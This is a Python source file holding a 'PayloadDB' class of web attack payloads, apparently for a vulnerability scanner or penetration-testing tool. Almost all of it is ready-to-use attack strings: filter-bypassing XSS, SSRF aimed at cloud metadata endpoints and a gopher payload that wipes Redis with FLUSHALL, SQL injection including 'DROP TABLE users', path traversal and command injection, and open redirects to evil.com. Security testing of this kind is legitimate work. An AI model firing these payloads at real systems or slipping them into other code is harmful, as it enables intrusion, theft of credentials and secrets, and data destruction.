class PayloadDB:
    """Real payload database for vulnerability testing."""

    XSS = [
        # Reflected XSS
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "';alert(1)//",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # DOM-based
        "#<script>alert(1)</script>",
        "javascript:alert(1)",
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        # Bypass common filters
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "{{constructor.constructor('alert(1)')()}}",
    ]

    SSRF = [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://[::1]:80",
        "http://0.0.0.0:80",
        "http://0:80",
        "http://0177.0.0.1:80",
        "http://2130706433:80",
        "http://0x7f000001:80",
        "http://127.1:80",
        "http://127.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:6379",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a",
    ]

    SQLI = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "admin'--",
        "1' AND SLEEP(5)--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' AND 1=1 UNION SELECT 1,2,3--",
        "'; DROP TABLE users--",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT @@version--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' WAITFOR DELAY '0:0:5'--",
    ]

    IDOR_TEMPLATES = [
        # Numeric IDs
        lambda base: [f"{base}/1", f"{base}/2", f"{base}/3", f"{base}/99999"],
        # UUIDs
        lambda base: [f"{base}/00000000-0000-0000-0000-000000000000"],
        # Parameter manipulation
        lambda base: [f"{base}?id=1", f"{base}?user_id=2", f"{base}?uid=3"],
    ]

    SSTI = [
        "{{7*7}}",
        "{{7*'7'}}",
        "<%= 7*7 %>",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${class}",
        "#set($x=7*7)$x",
    ]

    OPEN_REDIRECT = [
        "//evil.com",
        "//evil.com/@target.com",
        "https://evil.com",
        "http://evil.com",
        "///evil.com",
        "/\\evil.com",
        "data:text/html;base64,PHNjcmk=",
        "javascript:alert(1)",
        "///example.com@evil.com",
    ]

    LFI = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../Windows/System32/drivers/etc/hosts",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "/etc/passwd",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

    COMMAND_INJECTION = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "& id &",
        "|| id",
        "'; id;'",
        "| whoami",
        "; ls -la",
        "& ping -c 10 127.0.0.1 &",
    ]

    AUTH_BYPASS = [
        {"role": "admin", "header": "X-Forwarded-For: 127.0.0.1"},
        {"role": "admin", "header": "X-Admin: true"},
        {"role": "admin", "header": "X-Role: admin"},
        {"role": "admin", "header": "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ"},
        {"role": "admin", "header": "Cookie: admin=true"},
        {"role": "admin", "header": "X-Original-URL: /admin"},
        {"role": "admin", "header": "X-Rewrite-URL: /admin"},
        {"role": "admin", "header": "X-HTTP-Method-Override: GET"},
    ]

    NOSQLI = [
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$where": "1==1"}',
        "admin' || '1'=='1",
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    ]

    GRAPHQL = [
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"mutation{__typename}"}',
        '{"query":"{__typename}","variables":{}}',
        '{"query":"{user(id:1){id,name,email,password}}"}',
    ]

    def get_all(self, vuln_type: str, base_url: str = None) -> list:
        """Get payloads for a vulnerability type, optionally with URL templates."""
        if vuln_type == "xss":
            return self.XSS
        elif vuln_type == "ssrf":
            return self.SSRF
        elif vuln_type == "sqli":
            return self.SQLI
        elif vuln_type == "idor":
            results = []
            for tpl in self.IDOR_TEMPLATES:
                results.extend(tpl(base_url))
            return results
        elif vuln_type == "ssti":
            return self.SSTI
        elif vuln_type == "open_redirect":
            return self.OPEN_REDIRECT
        elif vuln_type == "lfi":
            return self.LFI
        elif vuln_type == "command_injection":
            return self.COMMAND_INJECTION
        elif vuln_type == "auth_bypass":
            return self.AUTH_BYPASS
        elif vuln_type == "nosqli":
            return self.NOSQLI
        elif vuln_type == "graphql":
            return self.GRAPHQL
        return []
